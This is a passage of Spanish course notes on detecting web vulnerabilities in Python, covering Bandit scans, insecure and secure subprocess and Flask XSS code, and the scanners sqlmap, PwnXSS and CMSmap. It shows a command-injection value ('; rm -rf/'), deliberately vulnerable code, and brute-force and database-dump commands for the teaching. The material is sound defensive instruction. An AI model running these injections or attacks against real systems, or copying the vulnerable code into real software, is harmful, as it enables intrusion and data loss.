    [main]  INFO    cli include tests: None
    [main]  INFO    cli exclude tests: None
    [main]  INFO    running on Python 3.10.12
    Run started:2024-11-24 10:35:38.328605

    Test results:
    >> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
    Severity: Low   Confidence: High
    CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/blacklists/blacklist_imports.html#b404-import-subprocess
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/6-ping_server_inseguro.py:1:0
    1       import subprocess
    2
    3       def ping_inseguro(server):

    --------------------------------------------------
    >> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True identified, security issue.
    Severity: High   Confidence: High
    CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/plugins/b602_subprocess_popen_with_shell_equals_true.html
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/6-ping_server_inseguro.py:4:11
    3       def ping_inseguro(server):
    4           return subprocess.Popen('ping -c 1 %s' % server, shell=True)
    5

    --------------------------------------------------

    Code scanned:
            Total lines of code: 4
            Total lines skipped (#nosec): 0

    Run metrics:
            Total issues (by severity):
                    Undefined: 0
                    Low: 1
                    Medium: 0
                    High: 1
            Total issues (by confidence):
                    Undefined: 0
                    Low: 0
                    Medium: 0
                    High: 2
    Files skipped (0):
    ```

- Esta función se puede reescribir de forma segura.

    - En lugar de pasar una cadena a un subproceso, nuestra función pasa una lista de cadenas. 
    - El programa ping obtiene cada argumento por separado (incluso si el argumento tiene un espacio en él), por lo que la shell no procesa otros comandos que proporciona el usuario después de finalizar el comando ping.

    - [Código seguro](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/7-ping_server_seguro.py)

        ```python	
        import subprocess

        def ping_seguro(server):
            args = ['ping','-c','1', server]
            return subprocess.Popen(args, shell=False)
            
        print(ping_seguro('8.8.8.8'))
        ```
    - En lugar de pasar una cadena al subroceso, nuestra función pasa una lista de cadenas. El programa ping obtiene cada argumento por separado,  de esta forma, aseguramos que el sehll no procese otros comandos proporcionados por el usuario despues de que finalice el comando ping.

    - Si probamos con la misma entrada que antes, el comando ping interpreta el valor del parámetros server correctamente como un solo argumento y devuelve el mensaje de error host desconcido, ya que el comando añadido (; rm -rf) invalida realizar el ping de forma correcta.

        ```bash
        >>> ping("8.8.8.8; rm -rf/")
        ping: unknown host 8.8.8.8; rm -rf/
        ```
    
### Plugin SQL injection

- Un ataque de inyeccion de SQL consiste en la inyección de una consulta SQL a través de los datos de entrada de una aplicación web.

- El plugin `B608: Test for SQL injection` tiene como objetico buscar dentro del código cadenas que se parezan a las sentencias SQL que estén involucradas en un ataque de inyección de SQL, por ejemplo:

    ```python
    SELECT %s FROM derp;" % var
    "SELECT thing FROM " + tab
    "SELECT " + val + " FROM " + tab + ...
    "SELECT {} FROM derp;".format(var)
    ```

### Ejercicio: Realizar pruebas de dectección de inyección de comandos y sql injection con `bandit`

- [Código vulnerable](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/8-codigo_vulnerable.py)

- Resultado de la ejecución de `bandit`:

    ```bash
    [main]  INFO    profile include tests: None
    [main]  INFO    profile exclude tests: None
    [main]  INFO    cli include tests: None
    [main]  INFO    cli exclude tests: None
    [main]  INFO    running on Python 3.10.12
    Run started:2024-11-24 10:46:52.792638

    Test results:
    >> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
    Severity: Medium   Confidence: Medium
    CWE: CWE-89 (https://cwe.mitre.org/data/definitions/89.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/plugins/b608_hardcoded_sql_expressions.html
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/8-codigo_vulnerable.py:12:15
    11
    12      cursor.execute("SELECT * FROM tabla WHERE id = '%s'" % identificador)
    13      cursor.execute("INSERT INTO tabla VALUES ('a', 'b', '%s')" % valor)

    --------------------------------------------------
    >> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
    Severity: Medium   Confidence: Medium
    CWE: CWE-89 (https://cwe.mitre.org/data/definitions/89.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/plugins/b608_hardcoded_sql_expressions.html
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/8-codigo_vulnerable.py:13:15
    12      cursor.execute("SELECT * FROM tabla WHERE id = '%s'" % identificador)
    13      cursor.execute("INSERT INTO tabla VALUES ('a', 'b', '%s')" % valor)
    14      cursor.execute("DELETE FROM tabla WHERE id = '%s'" % identificador)

    --------------------------------------------------
    >> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
    Severity: Medium   Confidence: Medium
    CWE: CWE-89 (https://cwe.mitre.org/data/definitions/89.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/plugins/b608_hardcoded_sql_expressions.html
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/8-codigo_vulnerable.py:14:15
    13      cursor.execute("INSERT INTO tabla VALUES ('a', 'b', '%s')" % valor)
    14      cursor.execute("DELETE FROM tabla WHERE id = '%s'" % identificador)
    15      cursor.execute("UPDATE tabla SET value = 'b' WHERE id = '%s'" % identificador)

    --------------------------------------------------
    >> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
    Severity: Medium   Confidence: Medium
    CWE: CWE-89 (https://cwe.mitre.org/data/definitions/89.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/plugins/b608_hardcoded_sql_expressions.html
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/8-codigo_vulnerable.py:15:15
    14      cursor.execute("DELETE FROM tabla WHERE id = '%s'" % identificador)
    15      cursor.execute("UPDATE tabla SET value = 'b' WHERE id = '%s'" % identificador)
    16

    --------------------------------------------------

    Code scanned:
            Total lines of code: 10
            Total lines skipped (#nosec): 0

    Run metrics:
            Total issues (by severity):
                    Undefined: 0
                    Low: 0
                    Medium: 4
                    High: 0
            Total issues (by confidence):
                    Undefined: 0
                    Low: 0
                    Medium: 4
                    High: 0
    Files skipped (0):
    ```

- [Código seguro](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/9-codigo_seguro_ejercicio.py)

    ```bash
    # Output bandit
    [main]  INFO    profile include tests: None
    [main]  INFO    profile exclude tests: None
    [main]  INFO    cli include tests: None
    [main]  INFO    cli exclude tests: None
    [main]  INFO    running on Python 3.10.12
    Run started:2024-11-24 10:48:08.070635

    Test results:
            No issues identified.

    Code scanned:
            Total lines of code: 10
            Total lines skipped (#nosec): 0

    Run metrics:
            Total issues (by severity):
                    Undefined: 0
                    Low: 0
                    Medium: 0
                    High: 0
            Total issues (by confidence):
                    Undefined: 0
                    Low: 0
                    Medium: 0
                    High: 0
    Files skipped (0):
    ```

### Otras herramientas de análisis estático en Python

- La revisión estática permite un análisis de seguridad sobre el código fuente o compilado de la aplicación, con lo que se obtienen vulnerabilidades o indicios que pueden ser comprobados posteriormente en un proceso de análisis dinámico.

- Es probable que su aplicación en Python dependa de muchas liberías de Python, y a lo largo del ciclo de vida del proyecto es probable que algunos de ellas tenga una vulnerabilidad de seguridad.

- Para ello disponemos de herramientas específicas que permiten realizar un escaneo de las dependencias y librerías de Python que estén usando en tu proyecnto y estén desactualizadas o tengan alguna issue relacionada con la seguridad.

#### Pyup

- Se trata de un sericio que permite analizar las dependencias y librerías que está usando nuestro proyecto.

- PAra ello es capaz de analizar los repositorios tanto públicos como privados de Github e internamente.

- https://github.com/pyupio/pyup

- Lo que hace es anlizar el archivo `requirements.txt` dentro del proyecto y ver si, para cada librería que utiliza, está empleando la última versión o, por lo contrario, se necesita actualizar.

#### Safety

Otra herramienta que nos puede ayudar a comprobar las dependencias de nuestro proyecto es `safety`, que cuenta con la capacidad de analizar el entorno de Python instsalado en su máquina y detectar las versiones de los paquetes que tengamos instaladas en nuestro entorno, para detectar librerías desactualizadas o que puedan contener algún tipo de vulnerabilidad.

- [Safety](https://safetycli.com/product/safety-cli?utm_source=data&utm_medium=redirect&utm_campaign=data_rd&utm_id=0624&utm_content=marketing)

- Instalación:

    ```bash
    $ pip install safety
    ```
    
- Ejemplo de uso:

    ```bash
    $ safety check -r requirements.txt
    safety scan -r requirements.txt
    ```

    - En el caso de que el proyecto no tenga ninguna dependencia, se nos devuelve el siguiente mensaje:

        ```bash
        No known vulnerabilities found.
        ```

    - En el caso de que tenga dependencias, se nos devuelve un listado de las dependencias que tenemos instaladas en nuestro entorno, junto con la versión que están instaladas y la versión más reciente que podemos encontrar en PyPI.

#### LGTM y reflas de seguridad en Python

- Es una herramienta que nos permite analizar los repositorios públicos de Github para la ejecución del análisis estático de código y análisis de vulnerabilidades de seguridad.

- [LGTM](https://github.blog/news-insights/product-news/the-next-step-for-lgtm-com-github-code-scanning/)

- Entre las principales características, podemos destacar:

    - Soporta los siguiente lenguajes de programación:
        - C
        - Java
        - JS
        - Python
        - C# ...
    - Analiza el contenido de los proyectos cuyo código fuente se alamace en repositorios públicos alojados en Bitbucket, GitHub, GitLab.
    - Analiza cada revisión de un determinado proyecto que contenga vulnerabilidades de seguridad.

- Podemos realizar una búsqyeda de las reglas de seguridad definidas por lenguaje. Podríamos buscar las reglas de Python con la cadena de búsqueda `language:Python security`.


### Ejemplo de código para detectar XSS

- Escribir directamente la entrada del usuario en un sitio web sin validad de manera correcta la entrada supone un vulnerabilidad de XSS.

- En este punto, la principal recomendación consiste en escapar la entrada antes de escribir la entrada del usuario en la página.

- La libería estándar de Python proporciona una serie de funciones de escape, entre las que podemos destacar:

    - [html.escape()](https://docs.python.org/3/library/html.html#html.escape)

- La mayoría de los frameworks web, como Django o Flask, disponen también de sus propias funciones de escape; por ejemplo: `flash.escape()`.

- En el siguiente ejemplo estamos utilizando Flask como framework para ejecutar nuestros servidor web, que atiende peticiones a través del navegador.

- Vamos a mostrar una aplicación de flask con una función implmentanda de forma insegura y otra de forma segura.

- En la primera función estamos usando directamente la entrada del usuario (por ejemplo, un parámetro de una petición HTTP) en una página web sin validar correctamente la entrada, lo que puede originar una vulnerabilidad de XSS.

- En la línea `input=requests.args.get('input', '')`, se toma un parámetro de entrada y se vevuelve en la respuesta que se muestra al usuario a través de étodo `make_response` que proprociona el framework Flask.

    ```python	
    from flask import Flask, request, make_response, escape
    app = Flask(__name__)

    @app.route('/inseguro')
    def inseguro():
        input = request.args.get('input', '')
        return make_response("Your input is " + input)

    @app.route('/seguro')
    def seguro():
        input = request.args.get('input', '')
        return make_response("Your input is " + escape(input))
    ```	

- En el código anterior, el primer método no es seguro ya que la variable input no se está validando, lo que deja la página web vulnerable a XSS.

    - Para evitar que nuestra aplicación se vuelva vulnerable a este tipo de ataques, es necesario escapar y validar todas aquellas entradas que impliquen enciar datos de entrada por parte del usuario, ya sea a través de un formulario o a través de la URL.

- El segundo método es más seguro ya que la variable input se está filtrando a través de la función `escape`.

    - Si estamos trabajando con Flask, una forma sencilla de eviar esta vulnerabilidad consiste en usar el motor de plantillas que proprociona Flask.

    - En este caso,el motor de plantillas, a través de la función `escape`, en encargaría de escapar y validar los datos de entrada.


## Detectar vulnerabilidades en sitios web con herramientas automáticas.

- Dentro del ecosistema de python disponemos de herramientas desarrolladas que tienen como objetivo analizar un sitio web en búsqueda de vulnerabilidades.

- Además de las que vamos a evaluar, OWASP mantiene una de las mejores listas de escáneres de vulnerabilidades.

- Estos escáneres de vulnerabilidades tienen la capacidad de automatizar la auditoría de seguridad y el escaneo de su ed y sitios web en busca de diferentes riestos de seguridad siguiendo las mejores prácticas de OWASP.

    - [OWASP Vulnerability Scanning Tools](https://owasp.org/www-community/Vulnerability_Scanning_Tools)


## Escaner de vulnerabilidades de XSS para python 3.7

`PwnXSS` se trata de un script desarrollado para python 3.7 que tiene como dependencias BeautifulSoup y Requests.

- La herramienta al partir de un sitio web que le pasamos como parámetro y de forma automática va probando con diferentes payloads para determinar si un dominio es vulnerable a XSS.

- Repositorio de Github:

    - [PwnXSS](https://github.com/pwn0sec/PwnXSS)

- Principales características:

    - Rastrear todos los enlaces en un sitio web.
    - Manejo avanzado de errores.
    - Soporte multiprocesamiento.

- Ejecución de `PwnXSS`:

    ```bash
    python3 pwnxss.py --help
    ```	

    ```bash	
    python3 pwnxss.py -u http://testpp.vulnweb.com
    ```

## Escáner de vulnerabilidades en sitios web CMS

- `CMSmap` es una herramienta open source escrita en Python diseñada especialmente para buscar posibles vulnerabilidades en todo tipo de portales que utilicen los CMS más utilizados como Joomla, Drupal o Wordpress.

- De forma automática, esta herramienta detectará la plataforma que está siendo utilizada y lanzará una serie de test para comprobar la seguridad de la misma y notificar el adminitrados en caso de detectar posibles vulnerabilidades en diferentes componentes como plugins, usuarios y contraseñas por defecto.

- Estas herramienta es muy fácil de usar y con algunos conocimientos de seguridad podemos auditar un sitio web que esté usando algunos de los CMS soportados.

- Instalación sencilla clonando el repositorio:

    ```bash
    $ git clone https://github.com/Dionach/CMSmap.git
    ```

- CMSmap trabaja escanando el CMS y sus módulos o plugins en busca de vulnerabilidades, para ello se vale de la base de datos disponible en `exploit-db.com`.

- Pra ver todas las opciones de ka herammienta lo hacemos con la opción -h o --help.

- Ejemplo de ejecución:

    ```bash
    $ python3 cmsmap.py https://example.com
    $ python3 cmsmap.py https://example.com -f W -F -- noedb -d
    $ python3 cmsmap.py https://example.com -i targets.txt -o output.txt
    $ python3 cmsmap.py https://example.com -u admin -p passwords.txt
    $ python3 cmsmap.py -k hashes.txt -w passwords.txt
    ```

### Ejecución de cmsmap en Python3

- La ejecución con python3 se puede realizar pasando como parámetro el sitio a escanear junto con el tipo de escaneo (-F corresponde a escaneo full).

    ```bash
    $ python3 cmsmap.py -F https://example.com
    ```

- Resultado:

    ```bash
    $ python3 cmsmap.py -F http://www.wordpress.com

    [l] Threads: 5
    [-] Target: http://www.wordpress.com (192.0.78.12)
    [M] Website Not in HTTPS: http://www.wordpress.com
    [l] Server: nginx
    [L] X-Frame-Options: Not Enforced
    [I] X-Content-Security-Policy: Not Enforced
    [I] X-Content-Type-Options: Not Enforced
    [L] Robots.txt Found: http://www.wordpress.com/robots.txt
    [I] CMS Detection: WordPress
    [I] Wordpress Theme: h4
    [M] EDB-ID: 11458 "WordPress Plugin Copperleaf Photolog 0.16 - SQL Injection"
    [M] EDB-ID: 39536 "WordPress Theme SiteMile Project 2.0.9.5 - Multiple Vulnerabilities"
    ```	

- Posteriormente, lo que hace es detectar ficheros wordpress por defecto y buscar determinados directorios.

    ```bash
    [-] Default WordPress Files:
    [l] http://www.wordpress.com/wp-content/themes/twentyten/license.txt
    [l] http://www.wordpress.com/wp-content/themes/twentyten/readme.txt
    [l] http://www.wordpress.com/wp-includes/ID3/license.commercial.txt
    [l] http://www.wordpress.com/wp-includes/ID3/license.txt
    [l] http://www.wordpress.com/wp-includes/ID3/readme.txt
    [l] http://www.wordpress.com/wp-includes/images/crystal/license.txt
    [l] http://www.wordpress.com/wp-includes/js/plupload/license.txt
    [l] http://www.wordpress.com/wp-includes/js/tinymce/license.txt
    [-] Checking interesting directories/files ...
    [L] http://www.wordpress.com/help.txt
    [L] http://www.wordpress.com/menu.txt
    ```	

- Vemos que, además de los usuarios, archivos por defecto, busca también plugins y directorios interesantes.

- Por otro lado, teniendo el usuario, podemos intentar ataques por diccionario o fuerza bruta, ofreciendo la posibilidad de realizar un ataque por diccionario, seleccionado nosotros el fichero que queramos de usuarios y passwords.
    ```
    Para ello vemos que podemos usar las opciones de fuerza bruta:

    Brute-Force:

    -u, -- usr          username or username file
    -p, -- psw          password or password file
    -x, -- noxmlrpc     brute forcing WordPress without XML-RPC
    ```

- Por defecto, un escaneo convenciona de CMSmap crea 5 hilos o threads desde los que analiza el sistema seleccionado.

- Este número se puede limitar para evitar que durante el escaneo puedan ocurrir ataques DoS.

- El número de hilos también podría ser maypr, lo cual aumenta el riesgo de producir una denegación de servicio a cambio se reduce el tiempo de escaneo.

## Resumen

- Dar a conocer el proyecto `OWASP` donde se definen y se detallan los 10 riesgos más importantes a nivel de aplicaciones web.

- Identificar las principales vulnerabilidades en sitios web como `SQL Injection` y `Cross-Site Scripting (XSS)`.
- Desarrollar scripts en python para detectar vulnerabilidades del tipo SQL Injection en sitios web identificando aquellos parámetros que pueden ser vulnerables al intentar concatenar caracteres especiales.
- Desarrollar scripts que lean de un fichero `sql-attack-vector.txt` que contiene posibles vectores de ataque sql injection.
- Desarrollar scripts que lean de un fichero `XSS-attack-vectors.txt` que contiene posibles vectores de ataque XSS.
- Instalar y utilizar la herramienta `SQLmap` para detectar `vulnerabilidades` de tipo `SQL Injection`.
- Utilizar sqlmap para obtener toda la `información sobre una base de datos` que está detrás de una vulnerabilidad de inyección SQL.
- Utilizar SQLmap poder atacar el servidor para `descubrir nombres de tablas` con la opción `-- tables` y `descargar una base de datos` con la opción `-dump`.
- Utilizar Bandit como herramienta diseñada para encontrar problemas de seguridad comunes en el código Python.
- Utilizar Bandit para análisis de `vulnerabilidades` del tipo inyección de comandos con el módulo `subprocess`
- Utilizar los plugins de `bandit` para `análisis de código estático`, el plugin `B602`: `subprocess_popen_with_shell_equals_true` tiene como objetivo buscar llamadas al método `subprocess.Popen()`
- Utilizar el plugin `B608: Test for SQL Injection` que tiene como objetivo buscar dentro del código cadenas que se parezcan a las sentencias de SQL que estén involucradas en alguna en un ataque de inyección de SQL.
- Dar a conocer otras herramientas de `análisis de código estático` en python como `pyup`, `Safety` y `LGTM`
- Detectar vulnerabilidades en sitios web con herramientas automaticas como `PwnXSS` como escaner de vulnerabilidades XSS para python 3.7 y `CMSmap` como escaner de vulnerabilidades en sitios web que usen CMS como Wordpress, Joomla o Drupal.

### FAQ

- `¿Que información hay que proporcionar a sqlmap para obtener la tablas de un sitio web?`

    Lo más importante primero es detectar aquella página y parámetro de consulta que pueda ser vulnerable,para ello hay que analizar el sitio en búsqueda de formularios de login o de búsqueda con el que interactuar.

    Una vez identificado este script podríamos ejecutar el siguiente comando para obtener las bases de datos:

    ```bash
    sqlmap -u <sitio> --dbs
    ```
    
### Glosario

- `CSRF Cross-site request forgery`

    Cross-site request forgery es un tipo de exploit malicioso de un sitio web en el que comandos no autorizados son transmitidos por un usuario en el cual el sitio web confía.​ Esta vulnerabilidad es conocida también por otros nombres como XSRF, enlace hostil, ataque de un click y secuestro de sesión

- `Exploit`

    Nombre con el que se identifica un programa informático malicioso, o parte del programa, que trata de forzar alguna deficiencia o vulnerabilidad de otro programa. El fin puede ser la destrucción o inhabilitación del sistema atacado, aunque normalmente se trata de violar las medidas de seguridad para poder acceder al mismo de forma no autorizada y emplearlo en beneficio propio o como origen de otros ataques a terceros. Los exploits se pueden caracterizar según las categorías de vulnerabilidades utilizadas para su ataque.

- `Hacking ético`

    Es una forma de referirse al acto de una persona usar sus conocimientos de informática y seguridad para realizar pruebas en redes y encontrar vulnerabilidades, para luego reportarlas y que se tomen medidas, sin hacer daño.

- `Inyección SQL`

    Es un método de infiltración de código que se vale de una vulnerabilidad informática presente en una aplicación en el nivel de validación de las entradas para realizar operaciones sobre una base de datos

- `Vulnerabilidad`

    Error o debilidad que, de llegar a explotarse, puede ocasionar una exposición a riesgos del sistema.

- `XSS Cross-site scripting`

    Cross-site scripting es un tipo de vulnerabilidad de seguridad típico de las aplicaciones Web, que puede permitir a una tercera persona inyectar en páginas web visitadas por el usuario código JavaScript o en otro lenguaje similar.​